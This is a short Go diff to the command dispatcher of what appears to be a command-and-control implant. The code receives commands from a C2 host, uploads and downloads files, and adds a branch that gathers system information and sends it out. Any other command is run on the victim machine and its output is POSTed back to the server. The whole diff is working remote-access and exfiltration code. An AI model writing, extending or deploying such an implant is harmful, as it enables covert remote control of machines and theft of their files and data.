@@ -15,7 +15,7 @@ func Middleware(client *http.Client, cmd string, host string) {
 	if strings.Compare(cmd, "quit") == 0 {
 		log.Println("[+] Quitting due to quit cmd from c2")
 		os.Exit(0)
-	} else if strings.HasPrefix(cmd, "upload") {
+	} else if strings.HasPrefix(cmd, "__upload__") {
 		cmdTokens := strings.Split(cmd, " ")
 		if len(cmdTokens) < 3 {
 			log.Println("[-] Invalid upload command syntax.")
@@ -24,7 +24,7 @@ func Middleware(client *http.Client, cmd string, host string) {
 			remoteFilePath := cmdTokens[2]
 			UploadFile(client, host+uploadFileURL, localFilePath, remoteFilePath)
 		}
-	} else if strings.HasPrefix(cmd, "download") {
+	} else if strings.HasPrefix(cmd, "__download__") {
 		cmdTokens := strings.Split(cmd, " ")
 		if len(cmdTokens) < 3 {
 			log.Println("[-] Invalid download command syntax.")
@@ -33,12 +33,16 @@ func Middleware(client *http.Client, cmd string, host string) {
 			localFilePath := cmdTokens[2]
 			DownloadFile(client, host+downloadFileURL+"?file="+remoteFilePath, localFilePath)
 		}
+	} else if strings.HasPrefix(cmd, "__sysinfo__") {
+		log.Printf("[+] Sending system information...")
+		sysInfo := GetCurrentSysInfo()
+		SendSysInfo(client, host+sysInfoURL, sysInfo)
 	} else {
 		out := ExecAndGetOutput(string(cmd))
 		log.Printf("[+] Sending back output:\n%s\n", string(out))
 		req, err := http.NewRequest("POST", host+cmdOutputURL, bytes.NewBuffer(out))
 		if err != nil {
-			log.Printf("[-] Error creating the GET request: %s\n", err)
+			log.Printf("[-] Error creating the POST request: %s\n", err)
 			return
 		}
 
@@ -47,5 +51,5 @@ func Middleware(client *http.Client, cmd string, host string) {
 
 		client.Do(req)
 	}
-	client.CloseIdleConnections()
+	defer client.CloseIdleConnections()
 }
